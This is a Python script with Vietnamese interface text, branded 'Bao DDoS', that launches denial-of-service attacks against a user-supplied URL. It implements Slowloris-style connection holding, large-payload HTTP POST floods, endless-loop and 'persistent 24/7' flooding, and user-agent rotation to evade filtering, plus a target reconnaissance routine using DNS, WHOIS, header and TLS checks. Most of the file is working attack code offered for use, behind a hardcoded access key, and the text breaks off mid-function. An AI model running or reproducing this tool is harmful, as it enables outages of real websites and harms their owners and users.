```python
#!/usr/bin/env python3

# -*- coding: utf-8 -*-

import requests
import threading
import multiprocessing
import time
import urllib.parse
import os
import random
import hashlib
import json
from datetime import datetime
from colorama import init, Fore, Back, Style
import socket
import ssl
import whois
import dns.resolver
from bs4 import BeautifulSoup
import hmac
import base64
import sys

# Initialize colorama
init()

# Fallback ANSI codes
try:
    from colorama import init, Fore, Back, Style
    init()
except ImportError:
    class Fore:
        CYAN = '\033[96m'
        BLUE = '\033[94m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        RED = '\033[91m'
        MAGENTA = '\033[95m'
        WHITE = '\033[97m'
        RESET = '\033[0m'

    class Back:
        BLACK = '\033[40m'
        BLUE = '\033[44m'
        CYAN = '\033[46m'
        RESET = '\033[0m'

    class Style:
        BRIGHT = '\033[1m'
        RESET_ALL = '\033[0m'

# File integrity check
EXPECTED_HASH = None

def check_file_integrity():
    """Kiểm tra tính toàn vẹn của tệp"""
    global EXPECTED_HASH
    try:
        with open(__file__, 'rb') as f:
            file_content = f.read()
            file_hash = hashlib.sha256(file_content).hexdigest()
            if EXPECTED_HASH is None:
                EXPECTED_HASH = file_hash
                print(f"{Fore.YELLOW}[HỆ THỐNG] Đã tạo giá trị băm mới cho tệp: {file_hash}{Fore.RESET}")
            elif file_hash != EXPECTED_HASH:
                print(f"{Fore.RED}[LỖI NGHIÊM TRỌNG] Tệp đã bị chỉnh sửa! Kết thúc thực thi.{Fore.RESET}")
                exit(1)
    except Exception as e:
        print(f"{Fore.RED}[LỖI NGHIÊM TRỌNG] Kiểm tra tính toàn vẹn thất bại: {str(e)}{Fore.RESET}")
        exit(1)

# Clear screen
def xoa_man_hinh():
    """Xóa màn hình console"""
    os.system('cls' if os.name == 'nt' else 'clear')

# Enhanced 3D attack confirmation effect
def confirm_effect():
    """Hiệu ứng xác nhận tấn công 3D nâng cao"""
    print(f"{Fore.RED}{Style.BRIGHT}┌════════════════════[ BAO DDOS ]════════════════════┐{Style.RESET_ALL}{Fore.RESET}")
    time.sleep(0.3)
    print(f"{Fore.RED}│{Fore.YELLOW}   KHỞI ĐỘNG HỆ THỐNG TẤN CÔNG BAO SIÊU CẤP...{Fore.RED}       │{Fore.RESET}")
    time.sleep(0.3)
    print(f"{Fore.RED}│{Fore.GREEN}   MỤC TIÊU ĐÃ BỊ KHÓA - SẴN SÀNG TRIỂN KHAI PHÁ HỦY!{Fore.RED}     │{Fore.RESET}")
    time.sleep(0.3)
    print(f"{Fore.RED}│{Fore.CYAN}   HỆ THỐNG SIÊU 3D - TOÀN LỰC KÍCH HOẠT!{Fore.RED}              │{Fore.RESET}")
    time.sleep(0.3)
    print(f"{Fore.RED}└════════════════════[ SIÊU TẤN CÔNG ]════════════════════┘{Style.RESET_ALL}{Fore.RESET}")
    time.sleep(0.7)

# New "super hacker" ASCII art
def display_quang_bao_ascii():
    """Hiển thị ASCII art phong cách hacker DDoS"""
    ascii_art = f"""
{Fore.RED}{Style.BRIGHT}     ╔═══════════════════════════════════════════════════════╗
     ║       BAO DDOS - SIÊU HACKER TỐI THƯỢNG 2025         ║
     ╚═══════════════════════════════════════════════════════╝{Style.RESET_ALL}
{Fore.CYAN}     ╔═╦═╦═╦╦╗╦═╦═╦═╗ ╦═╗  {Fore.YELLOW}┌╦╗╦═╦═╦═╦═╦═╦═╦╦╗
{Fore.CYAN}     ║╬║╬║╬║╦║╬║╬║╬╚╗{Fore.YELLOW}╠╩╗║╬║╬║╬║╬║╬║╬║╬║
{Fore.CYAN}     ╚╩╩╩╩╩╩╩╩╩╩╩╩═╝{Fore.YELLOW}╚╩╩╩╩╩╩╩╩╩╩╩╩╩╩╩╩
{Fore.MAGENTA}     ╔═════[ ĐỈNH CAO TẤN CÔNG MẠNG ]═════╗
{Fore.MAGENTA}     ║  POWERED BY BAO DDOS © 2025  ║
{Fore.MAGENTA}     ╚═══════════════════════════════════╝{Fore.RESET}
    """
    return ascii_art

# System information display
def hien_thi_thong_tin():
    """Hiển thị thông tin hệ thống"""
    return f"{Fore.CYAN}{Style.BRIGHT}Hệ thống: Bao DDoS | Phiên bản: 2025 Tối Thượng | Chế độ: Liên Tục 24/7 | Tính năng: Slowloris, HTTP Flood, Unlimited, 429/403 Overload, 522 Blitz, Tổng Hợp, Persistent Attack{Fore.RESET}"

# Warning display
def hien_thi_canh_bao():
    """Hiển thị thông báo cảnh báo"""
    return f"{Fore.RED}{Style.BRIGHT}[CẢNH BÁO] Việc sử dụng trái phép bị nghiêm cấm. Người dùng chịu hoàn toàn trách nhiệm pháp lý. Tấn công có thể gây thiệt hại nghiêm trọng cho hệ thống mục tiêu.{Style.RESET_ALL}{Fore.RESET}"

# Professional loading animation
def professional_loading():
    """Animation loading chuyên nghiệp"""
    print(f"{Fore.RED}{Style.BRIGHT}[HỆ THỐNG] Đang chuẩn bị triển khai tấn công...{Style.RESET_ALL}{Fore.RESET}")
    for _ in range(3):
        print(f"{Fore.YELLOW}█{Fore.RESET}", end="", flush=True)
        time.sleep(0.5)
    print(f"\n{Fore.GREEN}{Style.BRIGHT}[HỆ THỐNG] Triển khai sẵn sàng - Khởi động tấn công!{Style.RESET_ALL}{Fore.RESET}")
    time.sleep(0.5)

# ASCII animation for validation
def validation_animation(success=True):
    """Hiệu ứng ASCII động khi xác thực"""
    frames = [
        f"""
{Fore.CYAN}{Style.BRIGHT}   >>===>  
   █💻💾  
  /|\\  
  / \\{Style.RESET_ALL}{Fore.RESET}
{Fore.GREEN if success else Fore.RED}[HỆ THỐNG] {'Xác thực thành công!' if success else 'Xác thực thất bại!'}{Fore.RESET}
        """,
        f"""
{Fore.CYAN}{Style.BRIGHT}   >>===>  
   █💻💾  
  /| \\  
  /   \\{Style.RESET_ALL}{Fore.RESET}
{Fore.GREEN if success else Fore.RED}[HỆ THỐNG] {'Xác thực thành công!' if success else 'Xác thực thất bại!'}{Fore.RESET}
        """,
        f"""
{Fore.CYAN}{Style.BRIGHT}   >>===>  
   █💻💾  
   |\\  
  / \\{Style.RESET_ALL}{Fore.RESET}
{Fore.GREEN if success else Fore.RED}[HỆ THỐNG] {'Xác thực thành công!' if success else 'Xác thực thất bại!'}{Fore.RESET}
        """,
        f"""
{Fore.CYAN}{Style.BRIGHT}   >>===>  
   █💻💾  
   | \\  
  /   \\{Style.RESET_ALL}{Fore.RESET}
{Fore.GREEN if success else Fore.RED}[HỆ THỐNG] {'Xác thực thành công!' if success else 'Xác thực thất bại!'}{Fore.RESET}
        """
    ]
    for _ in range(2):
        for frame in frames:
            xoa_man_hinh()
            print(frame)
            time.sleep(0.2)

# ASCII animation for input
def input_animation():
    """Hiệu ứng ASCII động khi nhập liệu"""
    frames = [
        f"""
{Fore.YELLOW}{Style.BRIGHT}   >>>  
   🚀💥  
  /|  
  / \\{Style.RESET_ALL}{Fore.RESET}
{Fore.CYAN}[HỆ THỐNG] Đang chờ nhập liệu...{Fore.RESET}
        """,
        f"""
{Fore.YELLOW}{Style.BRIGHT}   >>>>  
   🚀💥  
  /| \\  
  /   \\{Style.RESET_ALL}{Fore.RESET}
{Fore.CYAN}[HỆ THỐNG] Đang chờ nhập liệu...{Fore.RESET}
        """,
        f"""
{Fore.YELLOW}{Style.BRIGHT}   >>>>>  
   🚀💥  
   |\\  
  / \\{Style.RESET_ALL}{Fore.RESET}
{Fore.CYAN}[HỆ THỐNG] Đang chờ nhập liệu...{Fore.RESET}
        """,
        f"""
{Fore.YELLOW}{Style.BRIGHT}   >>>>>>  
   🚀💥  
   | \\  
  /   \\{Style.RESET_ALL}{Fore.RESET}
{Fore.CYAN}[HỆ THỐNG] Đang chờ nhập liệu...{Fore.RESET}
        """
    ]
    xoa_man_hinh()
    print(display_quang_bao_ascii())
    for frame in frames:
        xoa_man_hinh()
        print(display_quang_bao_ascii())
        print(frame)
        time.sleep(0.2)

# New target selection effect
def target_selection_effect(target_type):
    """Hiệu ứng khóa mục tiêu sau khi chọn"""
    frames = [
        f"""
{Fore.RED}{Style.BRIGHT}   ╔════[ KHÓA MỤC TIÊU: {target_type.upper()} ]════╗
   ║     ĐANG QUÉT... [██    ] 20%     ║
   ╚═══════════════════════════════╝{Style.RESET_ALL}{Fore.RESET}
        """,
        f"""
{Fore.RED}{Style.BRIGHT}   ╔════[ KHÓA MỤC TIÊU: {target_type.upper()} ]════╗
   ║     ĐANG QUÉT... [████  ] 50%     ║
   ╚═══════════════════════════════╝{Style.RESET_ALL}{Fore.RESET}
        """,
        f"""
{Fore.RED}{Style.BRIGHT}   ╔════[ KHÓA MỤC TIÊU: {target_type.upper()} ]════╗
   ║     ĐANG QUÉT... [██████] 80%     ║
   ╚═══════════════════════════════╝{Style.RESET_ALL}{Fore.RESET}
        """,
        f"""
{Fore.GREEN}{Style.BRIGHT}   ╔════[ KHÓA MỤC TIÊU: {target_type.upper()} ]════╗
   ║     MỤC TIÊU ĐÃ KHÓA! [███████] 100% ║
   ╚═══════════════════════════════╝{Style.RESET_ALL}{Fore.RESET}
        """
    ]
    for frame in frames:
        xoa_man_hinh()
        print(display_quang_bao_ascii())
        print(frame)
        time.sleep(0.3)

# New super-enhanced analysis effect
def analysis_effect(url, status_code=None, error=None):
    """Hiệu ứng phân tích mục tiêu siêu đẹp với radar và bảng trạng thái"""
    frames = [
        f"""
{Fore.CYAN}{Style.BRIGHT}   ╔════[ QUÉT MỤC TIÊU: {url} ]════╗
   ║ 📡 ĐANG QUÉT MẠNG... [█    ] 10% ║
   ║     [ KẾT NỐI VỚI MỤC TIÊU ]     ║
   ╚═════════════════════════════════╝{Style.RESET_ALL}{Fore.RESET}
        """,
        f"""
{Fore.CYAN}{Style.BRIGHT}   ╔════[ QUÉT MỤC TIÊU: {url} ]════╗
   ║ 📡 ĐANG QUÉT MẠNG... [███  ] 30% ║
   ║     [ PHÂN TÍCH GIAO THỨC ]      ║
   ╚═════════════════════════════════╝{Style.RESET_ALL}{Fore.RESET}
        """,
        f"""
{Fore.CYAN}{Style.BRIGHT}   ╔════[ QUÉT MỤC TIÊU: {url} ]════╗
   ║ 📡 ĐANG QUÉT MẠNG... [████ ] 50% ║
   ║     [ KIỂM TRA TƯỜNG LỬA ]       ║
   ╚═════════════════════════════════╝{Style.RESET_ALL}{Fore.RESET}
        """,
        f"""
{Fore.CYAN}{Style.BRIGHT}   ╔════[ QUÉT MỤC TIÊU: {url} ]════╗
   ║ 📡 ĐANG QUÉT MẠNG... [█████] 70% ║
   ║     [ PHÂN TÍCH SSL/TLS ]        ║
   ╚═════════════════════════════════╝{Style.RESET_ALL}{Fore.RESET}
        """,
        f"""
{Fore.CYAN}{Style.BRIGHT}   ╔════[ QUÉT MỤC TIÊU: {url} ]════╗
   ║ 📡 ĐANG QUÉT MẠNG... [██████] 90%║
   ║     [ HOÀN TẤT PHÂN TÍCH ]       ║
   ╚═════════════════════════════════╝{Style.RESET_ALL}{Fore.RESET}
        """
    ]
    for frame in frames:
        xoa_man_hinh()
        print(display_quang_bao_ascii())
        print(frame)
        time.sleep(0.2)

    xoa_man_hinh()
    print(display_quang_bao_ascii())
    if status_code:
        print(f"{Fore.GREEN}{Style.BRIGHT}   ╔════[ BÁO CÁO MỤC TIÊU: {url} ]════╗")
        print(f"   ║ ⚡ MỤC TIÊU ONLINE                 ║")
        print(f"   ║ MÃ TRẠNG THÁI: {status_code}                ║")
        print(f"   ║ TRẠNG THÁI: SẴN SÀNG TẤN CÔNG      ║")
        print(f"   ╚═══════════════════════════════════╝{Style.RESET_ALL}{Fore.RESET}")
        for _ in range(2):
            xoa_man_hinh()
            print(display_quang_bao_ascii())
            print(f"{Fore.GREEN}{Style.BRIGHT}   ╔════[ BÁO CÁO MỤC TIÊU: {url} ]════╗")
            print(f"   ║ ⚡ MỤC TIÊU ONLINE                 ║")
            print(f"   ║ MÃ TRẠNG THÁI: {status_code}                ║")
            print(f"   ║ TRẠNG THÁI: SẴN SÀNG TẤN CÔNG      ║")
            print(f"   ╚═══════════════════════════════════╝{Style.RESET_ALL}{Fore.RESET}")
            time.sleep(0.3)
            xoa_man_hinh()
            print(display_quang_bao_ascii())
            time.sleep(0.2)
    elif error:
        print(f"{Fore.RED}{Style.BRIGHT}   ╔════[ BÁO CÁO MỤC TIÊU: {url} ]════╗")
        print(f"   ║ ⚠ LỖI PHÂN TÍCH                   ║")
        print(f"   ║ CHI TIẾT: {error[:50]:<50} ║")
        print(f"   ║ TRẠNG THÁI: KHÔNG THỂ TẤN CÔNG     ║")
        print(f"   ╚═══════════════════════════════════╝{Style.RESET_ALL}{Fore.RESET}")
        for _ in range(3):
            xoa_man_hinh()
            print(display_quang_bao_ascii())
            print(f"{Fore.RED}{Style.BRIGHT}   ╔════[ BÁO CÁO MỤC TIÊU: {url} ]════╗")
            print(f"   ║ ⚠ LỖI PHÂN TÍCH                   ║")
            print(f"   ║ CHI TIẾT: {error[:50]:<50} ║")
            print(f"   ║ TRẠNG THÁI: KHÔNG THỂ TẤN CÔNG     ║")
            print(f"   ╚═══════════════════════════════════╝{Style.RESET_ALL}{Fore.RESET}")
            time.sleep(0.3)
            xoa_man_hinh()
            print(display_quang_bao_ascii())
            time.sleep(0.2)
    time.sleep(1)

# Main display
def main_display():
    """Hiển thị giao diện chính"""
    xoa_man_hinh()
    print(display_quang_bao_ascii())
    time.sleep(0.8)
    print(hien_thi_thong_tin())
    time.sleep(0.8)
    professional_loading()
    print(hien_thi_canh_bao())
    print(f"{Fore.YELLOW}{Style.BRIGHT}[HỆ THỐNG] Hệ thống tấn công liên tục 24 giờ đã sẵn sàng!{Style.RESET_ALL}{Fore.RESET}")

# User-Agent list
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
]

# Random POST data
POST_DATA = {
    "key": random.randint(1, 9999999),
    "value": random.random(),
    "secret": "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=16)),
    "token": hashlib.md5(str(time.time()).encode()).hexdigest(),
    "attack_vector": random.choice(["destroy", "obliterate", "annihilate"])
}

# Global counters
manager = threading.Lock()
success_count = 0
error_count = 0
response_times = []

# Validate URL
def validate_url(url):
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    try:
        result = urllib.parse.urlparse(url)
        if not result.scheme or not result.netloc:
            raise ValueError("URL không hợp lệ")
        return url
    except Exception as e:
        raise ValueError(f"URL không hợp lệ: {e}")

# Save attack configuration for persistent mode
def save_attack_config(url, num_threads, requests_per_thread):
    """Lưu cấu hình tấn công vào file để chạy nền"""
    config = {
        "url": url,
        "num_threads": num_threads,
        "requests_per_thread": requests_per_thread,
        "start_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    try:
        with open("persistent_attack.json", "w") as f:
            json.dump(config, f)
        print(f"{Fore.YELLOW}[HỆ THỐNG] Đã lưu cấu hình tấn công nền: {url}{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}[LỖI] Không thể lưu cấu hình tấn công: {str(e)}{Fore.RESET}")

# Persistent attack process
def persistent_attack_process(url, requests_per_thread):
    """Tiến trình tấn công nền siêu mạnh"""
    session = requests.Session()
    methods = ["GET", "POST", "HEAD"]
    while True:
        try:
            method = random.choice(methods)
            headers = {
                'User-Agent': random.choice(USER_AGENTS),
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br'
            }
            payload = "X" * random.randint(102400, 204800)
            if method == "GET":
                response = session.get(url, headers=headers, timeout=2)
            elif method == "POST":
                response = session.post(url, data=payload, headers=headers, timeout=2)
            else:
                response = session.head(url, headers=headers, timeout=2)
            if response.status_code in (429, 403, 522):
                print(f"{Fore.RED}[PERSISTENT] Đòn đánh: Trạng thái {response.status_code} - MỤC TIÊU ĐANG BỊ QUÁ TẢI{Fore.RESET}")
            else:
                print(f"{Fore.YELLOW}[PERSISTENT] Đòn đánh: Trạng thái {response.status_code}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}[PERSISTENT] Đòn đánh thất bại: {str(e)}{Fore.RESET}")
        time.sleep(random.uniform(0.0001, 0.001))

# Slowloris attack
def slowloris_attack(url, duration):
    session = requests.Session()
    sockets = []
    try:
        for _ in range(500):
            sock = session.get(url, headers={'User-Agent': random.choice(USER_AGENTS)}, timeout=30, stream=True)
            sockets.append(sock)
            time.sleep(0.01)
        time.sleep(duration)
    except Exception as e:
        print(f"{Fore.RED}[SLOWLORIS] Lỗi: {str(e)}{Fore.RESET}")
    finally:
        for sock in sockets:
            sock.close()

# HTTP Flood attack
def http_flood_attack(url, request_count):
    session = requests.Session()
    for i in range(request_count):
        try:
            payload = "A" * 102400
            response = session.post(url, data=payload, headers={'User-Agent': random.choice(USER_AGENTS)}, timeout=5)
            print(f"{Fore.RED}[HTTP FLOOD] Đòn đánh #{i+1}: Trạng thái {response.status_code}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}[HTTP FLOOD] Đòn đánh #{i+1} thất bại: {str(e)}{Fore.RESET}")

# Unlimited threads attack
def unlimited_threads_attack(url):
    session = requests.Session()
    while True:
        try:
            payload = "A" * 102400
            response = session.post(url, data=payload, headers={'User-Agent': random.choice(USER_AGENTS)}, timeout=3)
            print(f"{Fore.RED}[KHÔNG GIỚI HẠN] Đòn đánh: Trạng thái {response.status_code}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}[KHÔNG GIỚI HẠN] Đòn đánh thất bại: {str(e)}{Fore.RESET}")
        time.sleep(0.001)

# 429/403 Overload attack
def overload_429_403_attack(url, request_count):
    session = requests.Session()
    for i in range(request_count):
        try:
            headers = {
                'User-Agent': random.choice(USER_AGENTS),
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache'
            }
            method = random.choice(["GET", "POST", "HEAD"])
            if method == "GET":
                response = session.get(url, headers=headers, timeout=2)
            elif method == "POST":
                response = session.post(url, data=POST_DATA, headers=headers, timeout=2)
            else:
                response = session.head(url, headers=headers, timeout=2)
            if response.status_code in (429, 403):
                print(f"{Fore.RED}[OVERLOAD 429/403] Đòn đánh #{i+1}: Trạng thái {response.status_code} - MỤC TIÊU ĐANG BỊ QUÁ TẢI{Fore.RESET}")
            else:
                print(f"{Fore.YELLOW}[OVERLOAD 429/403] Đòn đánh #{i+1}: Trạng thái {response.status_code}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}[OVERLOAD 429/403] Đòn đánh #{i+1} thất bại: {str(e)}{Fore.RESET}")
        time.sleep(0.0005)

# 522 Blitz attack
def blitz_522_attack(url, request_count):
    session = requests.Session()
    for i in range(request_count):
        try:
            headers = {
                'User-Agent': random.choice(USER_AGENTS),
                'Connection': 'keep-alive',
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Cache-Control': 'no-cache'
            }
            payload = "X" * 204800
            response = session.post(url, data=payload, headers=headers, timeout=1)
            if response.status_code == 522:
                print(f"{Fore.RED}[BLITZ 522] Đòn đánh #{i+1}: Trạng thái 522 - KẾT NỐI MỤC TIÊU ĐÃ SỤP!{Fore.RESET}")
            else:
                print(f"{Fore.YELLOW}[BLITZ 522] Đòn đánh #{i+1}: Trạng thái {response.status_code}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}[BLITZ 522] Đòn đánh #{i+1} thất bại: {str(e)}{Fore.RESET}")
        time.sleep(0.0003)

# Combined attack (1-19)
def combined_all_attack(url, request_count):
    session = requests.Session()
    methods = ["GET", "POST", "HEAD"]
    for i in range(request_count):
        try:
            headers = {
                'User-Agent': random.choice(USER_AGENTS),
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br'
            }
            payload = "X" * random.randint(102400, 204800)
            attack_type = random.choice(["slowloris", "flood", "429403", "522"])
            if attack_type == "slowloris":
                sock = session.get(url, headers=headers, timeout=30, stream=True)
                print(f"{Fore.RED}[TỔNG HỢP] Đòn đánh #{i+1}: Slowloris giữ kết nối{Fore.RESET}")
                time.sleep(0.01)
                sock.close()
            elif attack_type == "flood":
                response = session.post(url, data=payload, headers=headers, timeout=5)
                print(f"{Fore.RED}[TỔNG HỢP] Đòn đánh #{i+1}: HTTP Flood - Trạng thái {response.status_code}{Fore.RESET}")
            elif attack_type == "429403":
                method = random.choice(methods)
                if method == "GET":
                    response = session.get(url, headers=headers, timeout=2)
                elif method == "POST":
                    response = session.post(url, data=POST_DATA, headers=headers, timeout=2)
                else:
                    response = session.head(url, headers=headers, timeout=2)
                if response.status_code in (429, 403):
                    print(f"{Fore.RED}[TỔNG HỢP] Đòn đánh #{i+1}: 429/403 - MỤC TIÊU QUÁ TẢI{Fore.RESET}")
                else:
                    print(f"{Fore.YELLOW}[TỔNG HỢP] Đòn đánh #{i+1}: 429/403 - Trạng thái {response.status_code}{Fore.RESET}")
            else:  # 522
                response = session.post(url, data=payload, headers=headers, timeout=1)
                if response.status_code == 522:
                    print(f"{Fore.RED}[TỔNG HỢP] Đòn đánh #{i+1}: 522 - KẾT NỐI MỤC TIÊU SỤP!{Fore.RESET}")
                else:
                    print(f"{Fore.YELLOW}[TỔNG HỢP] Đòn đánh #{i+1}: 522 - Trạng thái {response.status_code}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}[TỔNG HỢP] Đòn đánh #{i+1} thất bại: {str(e)}{Fore.RESET}")
        time.sleep(random.uniform(0.0002, 0.001))

# Send request
def send_request(url, request_count):
    global success_count, error_count, response_times
    session = requests.Session()
    methods = ["GET", "POST", "HEAD"]
    for i in range(request_count):
        try:
            method = random.choice(methods)
            user_agent = random.choice(USER_AGENTS)
            headers = {'User-Agent': user_agent, 'Connection': 'keep-alive'}
            delay = random.uniform(0, 0.0001)
            time.sleep(delay)
            start_time = time.perf_counter()
            if method == "GET":
                response = session.get(url, timeout=3, headers=headers, allow_redirects=True)
            elif method == "HEAD":
                response = session.head(url, timeout=3, headers=headers, allow_redirects=True)
            else:
                response = session.post(url, data=POST_DATA, timeout=3, headers=headers, allow_redirects=True)
            end_time = time.perf_counter()
            response_time = (end_time - start_time) * 1000
            with manager:
                success_count += 1
                response_times.append(response_time)
            if response.status_code in (503, 429, 522):
                print(f"{Fore.YELLOW}[TẤN CÔNG] {method} Đòn đánh #{i+1}: Trạng thái {response.status_code} | Thời gian: {response_time:.2f}ms | Mục tiêu: SẮP SỤP{Fore.RESET}")
            else:
                print(f"{Fore.YELLOW}[TẤN CÔNG] {method} Đòn đánh #{i+1}: Trạng thái {response.status_code} | Thời gian: {response_time:.2f}ms | Mục tiêu: ĐANG BỊ ÁP LỰC{Fore.RESET}")
        except requests.exceptions.RequestException as e:
            with manager:
                error_count += 1
            print(f"{Fore.RED}[TẤN CÔNG THẤT BẠI] Đòn đánh #{i+1}: {str(e)}{Fore.RESET}")
        except Exception as e:
            with manager:
                error_count += 1
            print(f"{Fore.RED}[TẤN CÔNG THẤT BẠI] Đòn đánh #{i+1}: {str(e)}{Fore.RESET}")

# Loading animation
def loading_animation(text="Chuẩn bị triển khai tấn công", duration=3):
    """Animation loading chuyên nghiệp"""
    print(f"{Fore.RED}{Style.BRIGHT}[HỆ THỐNG] {text}...{Style.RESET_ALL}{Fore.RESET}")
    for _ in range(3):
        print(f"{Fore.YELLOW}█{Fore.RESET}", end="", flush=True)
        time.sleep(duration / 3)
    print(f"\n{Fore.GREEN}{Style.BRIGHT}[HỆ THỐNG] {text} - Hoàn tất!{Style.RESET_ALL}{Fore.RESET}")

# Enhanced key generation with HMAC
def generate_key_hash(key):
    """Tạo băm bảo mật dựa trên HMAC"""
    secret = "QUANGBAO2025ULTIMATE"
    return hmac.new(secret.encode(), key.encode(), hashlib.sha512).hexdigest()

# Enhanced key validation with ASCII animation
def validate_key():
    """Hệ thống xác thực nâng cao với hiệu ứng ASCII"""
    VALID_KEY = "baoddos"
    VALID_KEY_HASH = generate_key_hash(VALID_KEY)
    attempts = 0
    max_attempts = 3

    while attempts < max_attempts:
        xoa_man_hinh()
        print(display_quang_bao_ascii())
        print(f"{Fore.BLUE}{Style.BRIGHT}[XÁC THỰC] Nhập mã truy cập hệ thống:{Style.RESET_ALL}{Fore.RESET}")
        input_animation()
        xoa_man_hinh()
        print(display_quang_bao_ascii())
        user_key = input(f"{Fore.YELLOW}Mã: {Fore.WHITE}").strip()
        loading_animation("Đang xác minh thông tin đăng nhập", 2)

        if generate_key_hash(user_key) == VALID_KEY_HASH:
            validation_animation(success=True)
            print(f"{Fore.GREEN}{Style.BRIGHT}[XÁC THỰC] Đã cấp quyền truy cập. Hệ thống kích hoạt!{Style.RESET_ALL}{Fore.RESET}")
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            print(f"{Fore.CYAN}[THÔNG TIN] Thời gian: {current_time} | Trạng thái: Kích hoạt | Người thực thi: Bao DDoS{Fore.RESET}")
            return True
        else:
            attempts += 1
            remaining = max_attempts - attempts
            validation_animation(success=False)
            print(f"{Fore.RED}[XÁC THỰC] Mã sai. Số lần thử còn lại: {remaining}{Fore.RESET}")
            if remaining == 0:
                print(f"{Fore.RED}{Style.BRIGHT}[HỆ THỐNG] Quyền truy cập bị khóa!{Style.RESET_ALL}{Fore.RESET}")
                return False
            time.sleep(1)

# Enhanced website security assessment with detailed error handling
def assess_target_security(url):
    """Đánh giá mức độ bảo mật của website với báo lỗi chi tiết"""
    session = requests.Session()
    error_message = None
    status_code = None

    try:
        response_times = []
        status_codes = []
        for _ in range(10):
            start_time = time.perf_counter()
            try:
                response = session.get(url, timeout=5, headers={'User-Agent': random.choice(USER_AGENTS)})
                end_time = time.perf_counter()
                response_times.append((end_time - start_time) * 1000)
                status_codes.append(response.status_code)
                status_code = response.status_code
            except requests.exceptions.Timeout:
                error_message = "Lỗi kết nối: Timeout khi truy cập mục tiêu"
                break
            except requests.exceptions.ConnectionError:
                error_message = "Lỗi kết nối: Không thể kết nối đến mục tiêu"
                break
            except requests.exceptions.RequestException as e:
                error_message = f"Lỗi kết nối: {str(e)}"
                break
            time.sleep(0.1)

        if error_message:
            analysis_effect(url, error=error_message)
            return "CAO", 2000, 1000

        avg_response_time = sum(response_times) / len(response_times)
        error_rate = status_codes.count(500) / len(status_codes)

        domain = urllib.parse.urlparse(url).netloc
        dns_info = []
        try:
            answers = dns.resolver.resolve(domain, 'A')
            dns_info.append(f"DNS: {', '.join([str(r) for r in answers])}")
        except dns.resolver.NXDOMAIN:
            dns_info.append("Lỗi DNS: Không tìm thấy tên miền")
        except dns.resolver.Timeout:
            dns_info.append("Lỗi DNS: Timeout khi phân giải tên miền")
        except Exception as e:
            dns_info.append(f"Lỗi DNS: {str(e)}")

        whois_info = []
        try:
            w = whois.whois(domain)
            whois_info.append(f"Đăng ký: {w.registrar}")
            whois_info.append(f"Ngày tạo: {w.creation_date}")
            whois_info.append(f"Ngày hết hạn: {w.expiration_date}")
        except Exception as e:
            whois_info.append(f"Lỗi WHOIS: Không tra cứu được thông tin - {str(e)}")

        security_headers = []
        try:
            response = session.get(url, timeout=5)
            headers = response.headers
            important_headers = ['Content-Security-Policy', 'X-Frame-Options', 'X-Content-Type-Options', 'Strict-Transport-Security']
            for header in important_headers:
                security_headers.append(f"{header}: {'Có' if header in headers else 'Thiếu'}")
        except Exception as e:
            security_headers.append(f"Lỗi Header: Kiểm tra thất bại - {str(e)}")

        tech_stack = []
        try:
            response = session.get(url, timeout=5)
            soup = BeautifulSoup(response.text, 'html.parser')
            if 'wp-content' in response.text:
                tech_stack.append("Phát hiện WordPress")
            if 'Drupal' in response.text:
                tech_stack.append("Phát hiện Drupal")
            if 'nginx' in headers.get('Server', '').lower():
                tech_stack.append("Máy chủ NGINX")
            if 'apache' in headers.get('Server', '').lower():
                tech_stack.append("Máy chủ Apache")
        except Exception as e:
            tech_stack.append(f"Lỗi phân tích công nghệ: {str(e)}")

        ssl_info = []
        try:
            parsed_url = urllib.parse.urlparse(url)
            if parsed_url.scheme == 'https':
                context = ssl.create_default_context()
                with socket.create_connection((parsed_url.netloc, 443)) as sock:
                    with context.wrap_socket(sock, server_hostname=parsed_url.netloc) as ssock:
                        ssl_info.append(f"SSL/TLS: Được kích hoạt, Giao thức: {ssock.version()}")
            else:
                ssl_info.append("SSL/TLS: Không được kích hoạt")
        except ssl.SSLError:
            ssl_info.append("Lỗi SSL/TLS: Chứng chỉ không hợp lệ")
        except Exception as e:
            ssl_info.append(f"Lỗi SSL/TLS: {str(e)}")

        security_score = 0
        if avg_response_time < 1000:
            security_score += 30
        if error_rate < 0.1:
            security_score += 20
        if any('Có' in h for h in security_headers):
            security_score += 30
        if 'SSL/TLS: Được kích hoạt' in ssl_info:
            security_score += 20

